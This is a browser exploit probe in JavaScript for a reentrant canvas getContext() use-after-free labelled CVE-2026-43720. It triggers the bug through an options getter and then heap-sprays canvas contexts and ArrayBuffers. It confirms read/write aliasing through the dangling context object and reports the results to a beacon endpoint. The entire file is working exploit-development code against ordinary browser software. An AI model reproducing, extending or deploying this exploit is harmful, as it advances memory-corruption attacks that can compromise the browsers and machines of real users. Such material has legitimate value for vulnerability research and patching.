// p461-canvas-uaf-spray.js — Canvas getContext UAF: same-type spray + AB spray
//
// V460 crashed because lineWidth read hit freed memory before spray.
// This probe sprays IMMEDIATELY after UAF, using two strategies:
// A: Same-type spray (other CanvasRenderingContext2D) → aliased context
// B: AB spray → read getContextAttributes() (no state stack access)
// C: Determine exact object size from which AB size reclaims the slot
//
// CVE-2026-43720: reentrant getContext() UAF
// No Timer RELEASE_ASSERT, no IsoHeap, no wrapper invalidation.
(function() {
    var RUN = 'p461-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: Same-type spray — spray real canvas contexts
    // After UAF, create many canvas+getContext('2d') to reclaim slot
    // Then read through dangling wrapper to confirm aliasing
    // ═══════════════════════════════════════════════════════════════
    try {
        // Pre-create the trigger canvas
        var canvas = document.createElement('canvas');
        canvas.width = 10; canvas.height = 10;
        document.body.appendChild(canvas);

        var innerCtx = null;
        var outerCtx = null;
        var thenCount = 0;

        var settings = {};
        Object.defineProperty(settings, 'desynchronized', {
            get: function() {
                thenCount++;
                if (thenCount === 1) {
                    innerCtx = canvas.getContext('2d');
                }
                return false;
            }
        });

        // Trigger UAF
        outerCtx = canvas.getContext('2d', settings);

        if (!innerCtx || innerCtx === outerCtx) {
            B('A-SKIP', { thenCount: thenCount, same: innerCtx === outerCtx });
        } else {
            // innerCtx is dangling. IMMEDIATELY spray with real contexts.
            var sprayCanvases = [];
            var sprayCtxs = [];
            for (var i = 0; i < 200; i++) {
                var c = document.createElement('canvas');
                c.width = 10; c.height = 10;
                sprayCanvases.push(c);
                sprayCtxs.push(c.getContext('2d'));
            }

            B('A-SPRAYED', { count: sprayCtxs.length });

            // Set unique lineWidth on each spray context
            for (var i = 0; i < sprayCtxs.length; i++) {
                sprayCtxs[i].lineWidth = 100 + i;
            }

            // Read through dangling wrapper
            var readResult = {};
            try {
                readResult.lineWidth = innerCtx.lineWidth;
                readResult.globalAlpha = innerCtx.globalAlpha;
                readResult.shadowBlur = innerCtx.shadowBlur;
                readResult.miterLimit = innerCtx.miterLimit;
            } catch(e) {
                readResult.error = e.message.slice(0, 100);
            }

            B('A-READ', readResult);

            // Try to identify which spray context was aliased
            if (typeof readResult.lineWidth === 'number' && readResult.lineWidth >= 100) {
                var aliasedIdx = Math.round(readResult.lineWidth - 100);
                readResult.aliasedIdx = aliasedIdx;

                // Verify: write through innerCtx, read through spray
                innerCtx.lineWidth = 999.5;
                if (aliasedIdx >= 0 && aliasedIdx < sprayCtxs.length) {
                    readResult.verifyWrite = sprayCtxs[aliasedIdx].lineWidth;
                    readResult.verified = (readResult.verifyWrite === 999.5);
                }

                // Verify reverse: write through spray, read through innerCtx
                if (aliasedIdx >= 0 && aliasedIdx < sprayCtxs.length) {
                    sprayCtxs[aliasedIdx].lineWidth = 777.25;
                    readResult.reverseRead = innerCtx.lineWidth;
                    readResult.reverseVerified = (readResult.reverseRead === 777.25);
                }
            }

            B('A-RESULT', readResult);
        }
    } catch(e) { B('A-ERR', e.message.slice(0, 300)); }

    // ═══════════════════════════════════════════════════════════════
    // TEST B: AB spray — determine object size
    // Trigger UAF on a NEW canvas, spray ABs of different sizes,
    // then read getContextAttributes() which doesn't use state stack.
    // Also try save() which only touches m_unrealizedSaveCount.
    // ═══════════════════════════════════════════════════════════════
    try {
        var canvas2 = document.createElement('canvas');
        canvas2.width = 10; canvas2.height = 10;
        document.body.appendChild(canvas2);

        var innerCtx2 = null;
        var outerCtx2 = null;
        var thenCount2 = 0;

        var settings2 = {};
        Object.defineProperty(settings2, 'desynchronized', {
            get: function() {
                thenCount2++;
                if (thenCount2 === 1) {
                    innerCtx2 = canvas2.getContext('2d');
                }
                return false;
            }
        });

        outerCtx2 = canvas2.getContext('2d', settings2);

        if (!innerCtx2 || innerCtx2 === outerCtx2) {
            B('B-SKIP', 'no dangling');
        } else {
            // Spray ABs of different sizes. Each size gets a unique fill byte.
            var sizes = [256, 384, 512, 640, 768, 896, 1024, 1280, 1536, 2048, 3072, 4096];
            var abs = [];
            for (var si = 0; si < sizes.length; si++) {
                for (var i = 0; i < 100; i++) {
                    var ab = new ArrayBuffer(sizes[si]);
                    var view = new Uint8Array(ab);
                    var marker = 0x40 + si; // 0x40='@', 0x41='A', ..., 0x4B='K'
                    for (var j = 0; j < view.length; j++) {
                        view[j] = marker;
                    }
                    abs.push({ ab: ab, view: view, size: sizes[si], marker: marker });
                }
            }

            B('B-SPRAYED', { totalABs: abs.length, sizes: sizes });

            // Try save() — only touches m_unrealizedSaveCount, no state stack
            var saveResult = {};
            try {
                innerCtx2.save();
                saveResult.save1 = 'ok';
            } catch(e) { saveResult.save1 = 'ERR:' + e.message.slice(0, 60); }

            try {
                innerCtx2.save();
                saveResult.save2 = 'ok';
            } catch(e) { saveResult.save2 = 'ERR:' + e.message.slice(0, 60); }

            B('B-SAVE', saveResult);

            // Try reading properties that might not go through state stack
            var breads = {};

            // getContextAttributes reads m_settings directly
            try {
                var attrs = innerCtx2.getContextAttributes();
                breads.attrs = {
                    alpha: attrs.alpha,
                    desynchronized: attrs.desynchronized,
                    willReadFrequently: attrs.willReadFrequently
                };
            } catch(e) { breads.attrs = 'ERR:' + e.message.slice(0, 60); }

            // createLinearGradient doesn't access context members
            try {
                var grad = innerCtx2.createLinearGradient(0, 0, 100, 100);
                breads.gradient = !!grad ? 'ok' : 'null';
            } catch(e) { breads.gradient = 'ERR:' + e.message.slice(0, 60); }

            // createImageData doesn't access context state
            try {
                var idata = innerCtx2.createImageData(1, 1);
                breads.imageData = idata ? { w: idata.width, h: idata.height } : null;
            } catch(e) { breads.imageData = 'ERR:' + e.message.slice(0, 60); }

            B('B-READ', breads);

            // Now try lineWidth (goes through state stack — might crash with AB spray)
            // Wrap in its own try block since this may SIGSEGV
            try {
                breads.lineWidth = innerCtx2.lineWidth;
            } catch(e) { breads.lineWidth = 'ERR:' + e.message.slice(0, 60); }

            // Convert lineWidth to hex if it's a number
            if (typeof breads.lineWidth === 'number') {
                try {
                    var buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = breads.lineWidth;
                    var u8 = new Uint8Array(buf);
                    var hex = '';
                    for (var i = 0; i < 8; i++) hex += ('0' + u8[i].toString(16)).slice(-2);
                    breads.lineWidthHex = hex;
                } catch(e) {}
            }

            B('B-RESULT', breads);
        }
    } catch(e) { B('B-ERR', e.message.slice(0, 300)); }

    // ═══════════════════════════════════════════════════════════════
    // TEST C: Repeated UAF — trigger multiple times to test stability
    // ═══════════════════════════════════════════════════════════════
    try {
        var results = [];
        for (var round = 0; round < 5; round++) {
            var c = document.createElement('canvas');
            c.width = 10; c.height = 10;
            document.body.appendChild(c);

            var inner = null;
            var outer = null;
            var tc = 0;

            var s = {};
            Object.defineProperty(s, 'desynchronized', {
                get: function() {
                    tc++;
                    if (tc === 1) inner = c.getContext('2d');
                    return false;
                }
            });

            outer = c.getContext('2d', s);

            // Spray with real contexts
            for (var i = 0; i < 50; i++) {
                var sc = document.createElement('canvas');
                sc.width = 1; sc.height = 1;
                sc.getContext('2d');
            }

            var rr = { round: round, triggered: (inner && inner !== outer) };
            if (rr.triggered) {
                try { rr.lineWidth = inner.lineWidth; } catch(e) { rr.lineWidth = 'ERR'; }
                try { rr.globalAlpha = inner.globalAlpha; } catch(e) { rr.globalAlpha = 'ERR'; }
            }
            results.push(rr);
        }
        B('C-RESULT', results);
    } catch(e) { B('C-ERR', e.message.slice(0, 300)); }

    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
